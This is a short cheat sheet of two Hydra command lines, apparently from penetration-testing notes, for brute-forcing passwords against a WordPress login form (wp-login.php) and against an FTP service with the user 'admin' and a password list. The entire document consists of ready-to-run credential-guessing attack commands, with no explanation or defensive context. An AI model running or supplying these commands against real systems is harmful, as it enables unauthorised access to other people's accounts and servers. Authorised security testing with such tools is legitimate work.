				Wordpress Login Page
hydra -l user -P Wordlist IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

				FTP
hydra -l admin -P password.txt -vV  IP ftp